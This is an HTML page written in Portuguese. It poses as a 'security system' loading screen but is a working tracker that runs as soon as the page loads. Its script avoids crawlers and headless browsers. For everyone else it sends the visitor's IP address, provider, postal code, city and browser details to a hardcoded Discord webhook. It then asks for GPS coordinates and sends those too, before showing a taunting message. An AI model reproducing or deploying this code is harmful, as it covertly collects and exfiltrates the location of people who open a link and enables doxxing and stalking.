<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA DE SEGURANÃ‡A</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { border: 2px solid #f00; padding: 30px; background: #100; box-shadow: 0 0 20px #f00; }
        h1 { font-size: 3rem; margin: 0; display: none; }
        .loading { animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="box" id="m">
        <div id="l">
            <div class="loading">SINCROZINANDO PROTOCOLO...</div>
        </div>
        <h1 id="f">CE TA FUDIDO</h1>
    </div>

    <script>
        const W = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        async function rastrear() {
            // Se for robÃ´ da Amazon/Headless, ignora e nÃ£o manda nada
            if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) return;

            try {
                // Usa uma API que pega o provedor real e a cidade
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();

                if (d.org.includes("Amazon") || d.org.includes("Google")) return;

                // Envia IMEDIATAMENTE pro Discord
                await fetch(W, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: "ðŸŽ¯ **ALVO REAL IDENTIFICADO**",
                        embeds: [{
                            color: 16711680,
                            description: 
                                `**IP:** ${d.ip}\n` +
                                `**Provedor:** ${d.org}\n` +
                                `**CEP:** ${d.postal}\n` +
                                `**Cidade:** ${d.city} - ${d.region}\n` +
                                `**Aparelho:** ${navigator.userAgent}`
                        }]
                    })
                });

                // Tenta pegar o GPS em background (se ele permitir, manda outro log depois)
                navigator.geolocation.getCurrentPosition(p => {
                    fetch(W, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `ðŸ“ **LOC EXATA (GPS):** http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
                        })
                    });
                });

            } catch (e) {}

            // Mostra a frase na tela rÃ¡pido
            setTimeout(() => {
                document.getElementById('l').style.display = 'none';
                document.getElementById('f').style.display = 'block';
            }, 1000);
        }

        window.onload = rastrear;
    </script>
</body>
</html>
